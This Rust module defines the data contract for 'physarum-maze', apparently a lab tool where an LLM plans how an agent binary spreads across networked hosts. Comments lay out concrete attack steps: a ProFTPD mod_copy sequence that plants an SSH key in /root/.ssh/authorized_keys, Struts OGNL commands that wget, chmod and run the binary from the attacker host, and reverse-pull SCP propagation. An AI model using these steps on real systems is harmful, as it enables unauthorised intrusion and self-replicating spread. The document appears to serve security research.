use serde::{Deserialize, Serialize};
use std::net::IpAddr;

// ── Secret reference ──────────────────────────────────────────────────────────

/// A reference to a secret held by the local executor.
///
/// The LLM may request a capability class (e.g. an ephemeral SSH key for
/// reverse-pull propagation) but must never emit, carry, or store the secret
/// material itself. The executor resolves this reference locally at runtime.
/// Raw PEM, credentials, or API tokens must not appear in any strategy contract.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SecretRef {
    /// Short identifier for the audit trail — typically a hash of the public key.
    /// Safe to record in lineage; not the secret itself.
    pub key_id: String,
    pub source: SecretSource,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum SecretSource {
    /// Executor generates the key pair locally before the RCE fires.
    RuntimeGenerated,
    /// Key exists in the local agent's secret store (reserved for future use).
    LocalAgentSecretStore,
}

// ── Scanner fingerprint ───────────────────────────────────────────────────────

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PortScan {
    pub port: u16,
    pub protocol: TransportProtocol,
    pub state: PortState,
    pub service_guess: Option<String>,
    pub banner: Option<String>,
    pub version_hint: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum TransportProtocol {
    Tcp,
    Udp,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum PortState {
    Open,
    Filtered,
    Closed,
}

/// Best-effort OS hint derived from banners and handshakes only.
/// No raw sockets or CAP_NET_RAW required (Manager decision Gap 3).
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct OsHint {
    pub guess: String,
    pub confidence: f32,
    pub source: OsHintSource,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum OsHintSource {
    SshBanner,
    HttpHeader,
    ServiceBanner,
    Convention,
}

// ── Vulnerability candidate ───────────────────────────────────────────────────

/// CVE / vulnerability candidate associated with a service fingerprint finding.
///
/// Populated by `VulnerabilityIntelService` (Issue #131) via `LocalAdvisoryCache`,
/// `OsvFeed`, and future NVD/vendor providers. The LLM must treat
/// populated entries as prioritised exploit-path signals and reference the
/// `cve_id` in its `reasoning_summary`.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct VulnerabilityCandidate {
    /// CVE identifier, e.g. `"CVE-2021-23017"`.
    pub cve_id: String,
    /// CVSS base score 0.0–10.0, when available from the feed.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub cvss_score: Option<f32>,
    /// Short description of the vulnerability.
    pub description: String,
    /// Port on which the vulnerable service was detected.
    pub affected_port: u16,
    /// Organism-local confidence that this target is actually vulnerable (0.0–1.0).
    pub confidence: f32,
    /// Origin of this vulnerability intelligence.
    pub source: VulnerabilitySource,
    /// Service product name matched (e.g. `"nginx"`, `"apache"`).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub matched_service: Option<String>,
    /// Exact version string extracted from the banner (e.g. `"1.18.0"`).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub matched_version: Option<String>,
    /// Short evidence strings supporting this candidate (header extracts, banner fragments).
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub evidence: Vec<String>,
    /// `true` when the version match is exact; `false` for range or heuristic match.
    #[serde(default)]
    pub is_confirmed: bool,
    /// Affected version range string derived from the CVE advisory (e.g. `"< 1.21.0"`).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub affected_range: Option<String>,
    /// Broad exploit class: `"MemoryCorruption"`, `"DoS"`, `"InfoDisclosure"`, etc.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub exploit_class: Option<String>,
    /// Short impact description for LLM reasoning context.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub impact: Option<String>,
    /// Conditions that must be true for the CVE to be exploitable.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub preconditions: Vec<String>,
    /// CVE advisory and NVD reference URLs.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub references: Vec<String>,
}

/// How the `VulnerabilityCandidate` was obtained.
///
/// Each variant maps 1-to-1 to the data source that produced the candidate,
/// so the LLM reasoning loop and the lineage record can correctly attribute
/// confidence and provenance.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub enum VulnerabilitySource {
    /// Matched from an offline advisory JSON file loaded at startup
    /// (`advisory-cache/<service>.json`).  Highest-trust source — curator-reviewed.
    LocalAdvisoryCache,
    /// Queried live from the OSV API (`api.osv.dev/v1/query`) on a cache miss.
    /// Confidence is reduced when the service→ecosystem mapping is best-effort.
    OsvFeed,
    /// Queried from the NVD REST API (future provider; not yet wired).
    NvdFeed,
    /// Advisory from the vendor's own security bulletin
    /// (future provider; not yet wired).
    VendorAdvisory,
    /// physarum-sporangium template match that itself carries CVE metadata in
    /// the template `info` block (e.g. a CVE-specific Nuclei-style check).
    PhysarumSpore,
    /// Static heuristic from the service banner or `version_hint` string.
    /// Lowest-trust source — no advisory lookup performed.
    BannerHeuristic,
}

// ── Template selection ────────────────────────────────────────────────────────

/// Compact template descriptor sent to LLM for dynamic template selection.
/// Only id, severity, and tags are included to keep the prompt token-efficient.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TemplateMeta {
    pub id: String,
    /// Human-readable template name (e.g. "Apache Struts 2.0.0-2.5.25 - Remote Code Execution").
    /// Helps the LLM disambiguate templates with similar IDs or tags.
    #[serde(default, skip_serializing_if = "String::is_empty")]
    pub name: String,
    pub severity: String,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub tags: Vec<String>,
}

/// Query sent to LLM (Turn 1) before spore probes run.
/// LLM receives the target fingerprint + a compact template catalog and returns
/// the IDs it wants to execute. This replaces static tag-based filtering.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TemplateSelectionQuery {
    pub target: IpAddr,
    pub ports: Vec<PortScan>,
    pub available_templates: Vec<TemplateMeta>,
    pub lineage_summary: LineageSummary,
}

/// LLM response to template selection (Turn 1).
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TemplateSelectionResponse {
    /// Template IDs the LLM wants to run. Empty means run all available.
    pub selected_ids: Vec<String>,
    pub reasoning: String,
}

// ── Pattern evidence summary ──────────────────────────────────────────────────

/// Condensed evidence from physarum-sporangium HTTP pattern probing.
///
/// Includes both fingerprint/context findings (e.g. server version detection,
/// info-level) and actionable risk findings (severity >= low, confidence >= 0.7).
/// Use `is_actionable = true` to distinguish higher-priority findings from
/// passive fingerprint context. Only the fields needed for propagation reasoning
/// are included; raw response bodies are never forwarded.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PatternFindingSummary {
    /// Template ID that matched (e.g. "nginx-server-detect", "missing-hsts").
    pub check_id: String,
    /// Human-readable template name.
    pub name: String,
    /// Severity level: "info" | "low" | "medium" | "high" | "critical".
    pub severity: String,
    /// Probe confidence — 0.0–1.0.
    pub confidence: f32,
    /// Short summary of which matchers fired (e.g. "words=['nginx']").
    pub matched_summary: String,
    /// Values extracted by the template (version strings, page titles, etc.).
    pub extracted: Vec<String>,
    /// True when severity >= Low and confidence >= 0.7.
    /// Signals that the LLM should treat this finding as actionable evidence.
    pub is_actionable: bool,
    /// CVE / vulnerability candidates linked to this finding.
    ///
    /// Populated by `VulnerabilityIntelService` (Issue #131) via `LocalAdvisoryCache`,
    /// `OsvFeed`, and future NVD/vendor providers.
    /// When non-empty the LLM weights exploit-aware propagation paths higher.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub vulnerability_candidates: Vec<VulnerabilityCandidate>,
}

// ── Discovery query ───────────────────────────────────────────────────────────

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DiscoveryQuery {
    pub target: IpAddr,
    pub ports: Vec<PortScan>,
    pub os_hint: Option<OsHint>,
    pub lineage_summary: LineageSummary,
    pub methods_tried: Vec<String>,
    /// Strategies rejected by the policy gate on previous attempts.
    /// Fed back to the LLM so it does not re-propose blocked methods (Gap 1).
    pub rejected_strategies: Vec<RejectedStrategy>,
    /// One-based: first attempt is 1, last valid attempt is `max_attempts`.
    /// Values above `max_attempts` are rejected by `PolicyGate::evaluate()`.
    pub attempt_number: u8,
    /// Pattern-evidence findings from physarum-sporangium HTTP probing.
    ///
    /// Includes both fingerprint/context findings (e.g. server version, info-level)
    /// and actionable risk findings (severity >= low, confidence >= 0.7).
    /// Use `is_actionable = true` to distinguish higher-priority evidence.
    /// Empty when no web-like services are detected or sporangium enrichment fails.
    ///
    /// `default` ensures existing lineage JSON without this field deserialises
    /// cleanly — backwards-compatible with v0.3.0 and earlier lineage records.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub pattern_findings: Vec<PatternFindingSummary>,
    /// Agent's own IP on the internal network interface.
    /// Used by the LLM to construct exploit payloads that reference the agent
    /// as a binary source (e.g. wget http://{source_ip}:8001/physarum-maze).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub source_ip: Option<IpAddr>,
    /// Ephemeral SSH public key (OpenSSH format) generated by the agent before
    /// the exploit attempt. The LLM embeds this in the RCE payload to plant it
    /// in the target's authorized_keys — enabling SSH access for subsequent
    /// ScpUpload / SshCommand steps.
    ///
    /// Raw private key material NEVER appears here or in lineage. Only the pubkey
    /// is shared with the LLM. The executor holds the private key locally.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub ephemeral_pubkey: Option<String>,

    /// Enrichment capabilities available to the LLM for this attempt.
    ///
    /// Non-empty when physarum-maze has an offline Exploit-DB index loaded.
    /// The LLM may request one enrichment round-trip per attempt by including
    /// an `EnrichmentRequest` in its `PropagationStrategy` response.
    /// physarum-maze performs the lookup and feeds the result back as
    /// `enrichment_result` in a second (continuation) DiscoveryQuery call.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub available_enrichment_capabilities: Vec<EnrichmentCapability>,

    /// Structured exploit-reference metadata returned after an `EnrichmentRequest`.
    ///
    /// Present only on the continuation call (Turn 2b). The LLM uses this
    /// metadata to reason about technique and construct `OgnlExec.commands`
    /// or other bounded delivery steps without seeing raw exploit payloads.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub enrichment_result: Option<EnrichmentResult>,
}

/// Minimal lineage context sent to the LLM — no secrets, no raw payloads.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct LineageSummary {
    pub node_id: String,
    pub hop_count: u8,
    pub current_score: f32,
    pub colonized_count: usize,
}

// ── Rejected strategy feedback (Gap 1 resolution) ────────────────────────────

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RejectedStrategy {
    /// One-based attempt number at which this strategy was rejected.
    pub attempt_number: u8,
    pub method_class: PropagationMethodClass,
    pub rejection_reason: PolicyRejectionReason,
    pub policy_rule: String,
    pub summary: String,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub enum PropagationMethodClass {
    Ssh,
    Http,
    Exploit,
    Custom,
    NoPath,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum PolicyRejectionReason {
    MethodNotAllowed,
    ConfidenceBelowThreshold,
    TargetOutsideAllowedCidr,
    MaxAttemptsExceeded,
    InvalidSecretReference,
    ArtifactTypeNotAllowed,
    ExploitNotEnabledForLabMode,
    Custom(String),
}

// ── Propagation strategy ──────────────────────────────────────────────────────

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PropagationStrategy {
    pub method: PropagationMethod,
    pub artifact_type: ArtifactType,
    pub bootstrap_plan: Option<BootstrapPlan>,
    pub confidence: f32,
    pub reasoning_summary: String,
    pub preconditions: Vec<String>,
    pub validation_check: Option<String>,
    pub safety_notes: Vec<String>,
    /// LLM may request Exploit-DB enrichment before finalising strategy.
    ///
    /// When present, physarum-maze performs the lookup, builds an `EnrichmentResult`,
    /// and calls the LLM a second time (Turn 2b) with the result. The second response
    /// must NOT include another `enrichment_request` (one round-trip per attempt).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub enrichment_request: Option<EnrichmentRequest>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum PropagationMethod {
    Ssh {
        user: String,
        auth: SshAuth,
    },
    Http {
        path: String,
        http_method: HttpMethod,
        headers: Vec<(String, String)>,
        /// TCP port to target. LLM must set this from the open ports list.
        /// Defaults to 80 when absent (backward-compatible with v0.3.x lineage).
        #[serde(default, skip_serializing_if = "Option::is_none")]
        port: Option<u16>,
    },
    /// Lab-only. Disabled by default; requires explicit lab policy enablement.
    Exploit {
        cve: String,
    },
    /// Disabled by default in `PolicyGate::lab_default()`.
    /// Must be explicitly enabled by lab policy configuration.
    Custom {
        description: String,
    },
    NoPath {
        reason: String,
    },
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum SshAuth {
    EmptyPassword,
    PrivateKey,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum HttpMethod {
    Get,
    Post,
    Put,
}

// ── Artifact type (Gap 4 resolution — typed enum) ────────────────────────────

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub enum ArtifactType {
    AgentBinary,
    Script,
    HttpRequest,
    None,
}

// ── Bootstrap plan (Gap 5 resolution — Option A: typed steps) ────────────────

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BootstrapPlan {
    pub steps: Vec<BootstrapStep>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BootstrapStep {
    pub action: BootstrapAction,
    pub target: String,
    pub timeout_ms: u64,
    pub requires_root: bool,
    pub expected_result: ExpectedResult,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum BootstrapAction {
    HttpPost {
        path: String,
        body: String,
        /// TCP port to target. Defaults to 80 when absent.
        #[serde(default, skip_serializing_if = "Option::is_none")]
        port: Option<u16>,
        /// Custom HTTP headers (e.g. Content-Type with OGNL payload for CVE-2020-17530).
        #[serde(default, skip_serializing_if = "Vec::is_empty")]
        headers: Vec<(String, String)>,
        /// When true, any HTTP response (including 4xx/5xx) counts as success.
        /// Set this for exploit steps where the server executes the payload
        /// regardless of its HTTP response status.
        #[serde(default)]
        accept_any_response: bool,
    },
    HttpGet {
        path: String,
        /// TCP port to target. Defaults to 80 when absent.
        #[serde(default, skip_serializing_if = "Option::is_none")]
        port: Option<u16>,
    },
    /// A → B push via SCP.
    ///
    /// `local_path` accepts the sentinel `"__self__"` which the executor
    /// substitutes with the path of the running physarum-maze binary
    /// (`std::env::current_exe()`). This keeps the LLM output portable
    /// across environments without hardcoding installation paths.
    ScpUpload {
        /// Local file to upload. Use `"__self__"` to upload the agent binary.
        local_path: String,
        remote_path: String,
        /// Remote SSH user. Infer from OS hint (root, ubuntu, ec2-user, …).
        /// Omit to default to "root".
        #[serde(default, skip_serializing_if = "Option::is_none")]
        user: Option<String>,
    },
    /// B → A reverse-pull propagation pattern.
    ///
    /// Used when Host B's inbound SSH blocks Host A but outbound is open.
    /// The RCE delivers a small bootstrap script to Host B. Host B connects
    /// OUT to Host A and pulls the physarum-maze binary via SCP.
    ///
    /// Key lifecycle (resolved by the executor, not the LLM):
    ///   1. Generate ephemeral ed25519 key pair before RCE fires.
    ///   2. Add public key to Host A's authorized_keys (temporary).
    ///   3. Inject private key into the bootstrap script at runtime.
    ///   4. Remove public key after propagation succeeds or times out.
    ///
    /// The LLM specifies capability class via `secret_ref`.
    /// Raw key material never travels through the strategy contract or lineage.
    ScpPullFromSource {
        source_ip: String,
        source_path: String,
        dest_path: String,
        /// Reference to the ephemeral key — not the key itself.
        /// The executor generates and injects the actual key material locally.
        secret_ref: SecretRef,
    },
    SshCommand {
        command: String,
        /// Remote SSH user. Infer from OS hint (root, ubuntu, ec2-user, …).
        /// Omit to default to "root".
        #[serde(default, skip_serializing_if = "Option::is_none")]
        user: Option<String>,
    },
    /// Must be explicitly permitted by lab policy before execution.
    Custom { description: String },

    /// CVE-2015-3306 ProFTPD mod_copy: unauthenticated file copy via SITE CPFR/CPTO.
    ///
    /// Preconditions (all three required):
    ///   - ProFTPD 1.3.5 with mod_copy loaded in proftpd.conf
    ///   - FTP port reachable from attacker
    ///   - FTP process has write permission on dest_path (typically runs as root)
    ///
    /// Sequence executed by physarum-maze:
    ///   1. Anonymous FTP login (USER anonymous / PASS)
    ///   2. PASV data channel + STOR → upload ephemeral pubkey to staging_path
    ///   3. SITE CPFR staging_path → mark source (no auth check — the CVE)
    ///   4. SITE CPTO dest_path   → copy to /root/.ssh/authorized_keys
    ///
    /// Pubkey content is resolved from the ephemeral keypair at execution time.
    /// No key material appears in the strategy JSON or lineage.
    FtpModCopy {
        /// FTP control port. Defaults to 21 when absent.
        #[serde(default, skip_serializing_if = "Option::is_none")]
        port: Option<u16>,
        /// Staging path on the remote FTP server for the uploaded pubkey.
        /// e.g. "/tmp/physarum_authorized_keys"
        staging_path: String,
        /// Destination path for SITE CPTO.
        /// e.g. "/root/.ssh/authorized_keys"
        dest_path: String,
    },

    /// Apache Struts OGNL multi-command delivery (replaces `__struts_bypass__` sentinel).
    ///
    /// Each element of `commands` becomes a single HTTP POST with an OGNL-wrapped OS command.
    /// Struts OGNL does NOT reliably chain shell commands with `&&` — one command per request
    /// is the correct delivery pattern for `freemarker.Execute` and similar sandboxed evaluators.
    ///
    /// The executor iterates `commands` in order, wrapping each in the standard
    /// SecurityMemberAccess bypass template and sending a separate POST.
    /// A non-2xx response is acceptable (Struts often returns 400/500 after RCE fires).
    ///
    /// Typical multi-step sequence (LLM decides):
    ///   commands[0] = "wget http://<source_ip>:8001/physarum-maze -O /tmp/physarum-maze"
    ///   commands[1] = "chmod +x /tmp/physarum-maze"
    ///   commands[2] = "/tmp/physarum-maze --mode propagated ..."
    ///
    /// Source IP is substituted by the executor from the local network interface — never
    /// hardcoded by the LLM. The LLM uses the `<source_ip>` placeholder in commands.
    OgnlExec {
        /// One OS command per element. Executor sends one POST per command.
        /// Use `<source_ip>` as a placeholder; executor substitutes the real IP.
        commands: Vec<String>,
        /// HTTP port. Defaults to 8080 for Struts when absent.
        #[serde(default, skip_serializing_if = "Option::is_none")]
        port: Option<u16>,
        /// URL path prefix. Defaults to "/" when absent.
        #[serde(default, skip_serializing_if = "Option::is_none")]
        path_prefix: Option<String>,
        /// Extra HTTP headers beyond the OGNL Content-Type. Rarely needed.
        #[serde(default, skip_serializing_if = "Vec::is_empty")]
        extra_headers: Vec<(String, String)>,
    },
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ExpectedResult {
    pub success_indicator: String,
    pub failure_indicator: Option<String>,
}

// ── Lineage evidence (Gap 7 resolution — schema defined here, wired in Phase 4) ──

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct LlmAttemptEvidence {
    pub target: String,
    /// One-based attempt number matching `DiscoveryQuery::attempt_number`.
    pub attempt_number: u8,
    /// Stimulus that triggered this evidence pipeline:
    /// `"startup-sensing"`, `"icmp"`, `"tcp-syn"`, `"ebpf"`, or `"discovery"`.
    pub stimulus_source: String,
    pub method_class: PropagationMethodClass,
    pub artifact_type: ArtifactType,
    pub policy_decision: PolicyDecision,
    pub execution_result: ExecutionResultSummary,
    pub reasoning_summary: String,
    pub next_action: NextAction,
    /// Stable identifier for the strategy (e.g. sha256 of the JSON).
    pub strategy_id: String,
    /// LLM-assigned confidence for the proposed strategy (0.0–1.0).
    /// Zero when the LLM returned an error or NoPath.
    #[serde(default)]
    pub strategy_confidence: f32,
    /// TCP port targeted by the proposed strategy (e.g. 80 for Http, 22 for Ssh).
    /// Absent when the LLM returned an error or NoPath.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub target_port: Option<u16>,
    /// CVE identifiers present in the DiscoveryQuery at the time of this attempt.
    /// Empty when no CVE candidates were enriched for this target.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub cve_candidate_ids: Vec<String>,
    /// True when the LLM requested Exploit-DB enrichment during this attempt.
    #[serde(default)]
    pub enrichment_requested: bool,
    /// Exploit-DB reference ID selected after enrichment (e.g. "EDB-44556").
    /// Absent when no enrichment was performed or no reference was selected.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub exploit_reference_id: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum PolicyDecision {
    Accepted,
    Rejected {
        reason: PolicyRejectionReason,
        rule: String,
    },
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum ExecutionResultSummary {
    Success,
    Failed { description: String },
    Skipped { reason: String },
    NotAttempted,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum NextAction {
    RetryWithLlm,
    MarkDeadEnd,
    ContinueOrganismLoop,
    MaxAttemptsReached,
}

// ── Exploit-DB enrichment types (Issue #144) ─────────────────────────────────

/// Enrichment data source the LLM may request.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub enum EnrichmentCapability {
    /// Offline Exploit-DB index embedded in the physarum-maze binary.
    /// Always available when the binary was built with `EXPLOITDB_CSV` data.
    ExploitDb,
    /// Local SearchSploit installation (`searchsploit --json`).
    /// Available only when `searchsploit` is present in PATH at runtime.
    SearchSploitLocal,
}

/// LLM's request for exploit-reference enrichment.
///
/// Included as `PropagationStrategy::enrichment_request` when the LLM wants
/// to look up structured exploit metadata before committing to a strategy.
/// physarum-maze performs the lookup and returns an `EnrichmentResult`.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct EnrichmentRequest {
    /// Which enrichment source to query.
    pub source: EnrichmentCapability,
    /// CVE identifier to look up (e.g. `"CVE-2020-17530"`).
    pub cve_id: String,
    /// LLM's reasoning for requesting this enrichment — recorded in lineage.
    pub reason: String,
}

/// Structured exploit-reference metadata returned to the LLM after enrichment.
/// Raw exploit payloads are never included — only bounded metadata.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ExploitReference {
    /// Exploit-DB numeric ID as a string (e.g. `"44556"`).
    pub exploit_reference_id: String,
    /// Source that produced this reference.
    pub source: EnrichmentCapability,
    /// CVE this reference covers.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub cve_id: Option<String>,
    /// Affected product name (e.g. `"Apache Struts"`).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub product: Option<String>,
    /// Affected version range string (e.g. `"2.0.0 - 2.5.29"`).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub version_range: Option<String>,
    /// Target platform (e.g. `"linux"`, `"windows"`, `"multiple"`).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub platform: Option<String>,
    /// Exploit delivery class (e.g. `"webapps"`, `"remote"`, `"local"`).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub exploit_type: Option<String>,
    /// True when Exploit-DB marks the exploit as verified.
    #[serde(default)]
    pub verified_status: bool,
    /// True when authentication is required before exploitation.
    #[serde(default)]
    pub requires_auth: bool,
    /// True when user interaction (e.g. click, open file) is needed.
    #[serde(default)]
    pub requires_user_interaction: bool,
    /// True when exploit needs outbound callback (e.g. wget to attacker).
    #[serde(default)]
    pub requires_outbound_callback: bool,
    /// Expected effect (e.g. `"Remote Code Execution"`, `"Privilege Escalation"`).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub expected_effect: Option<String>,
    /// Safety classification for PolicyGate (`"lab-only"`, `"destructive"`, etc.).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub safety_class: Option<String>,
    /// Brief technique summary — the LLM uses this to reason about delivery steps.
    /// Never contains raw payloads. Example:
    /// `"OGNL injection via Content-Type header; freemarker.Execute; one command per request"`.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub summary: Option<String>,
}

/// physarum-maze's response to an `EnrichmentRequest`.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct EnrichmentResult {
    /// The original request that triggered this lookup.
    pub request: EnrichmentRequest,
    /// References found. Empty on cache miss.
    pub references: Vec<ExploitReference>,
    /// Lookup outcome for the LLM and lineage.
    pub status: EnrichmentLookupStatus,
}

/// Outcome of an enrichment lookup.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum EnrichmentLookupStatus {
    /// One or more references found.
    Found { count: usize },
    /// CVE not present in the local index.
    NotFound,
    /// Policy or scope check blocked the request.
    PolicyBlocked { reason: String },
    /// Source not available at runtime (e.g. searchsploit not in PATH).
    SourceUnavailable,
}
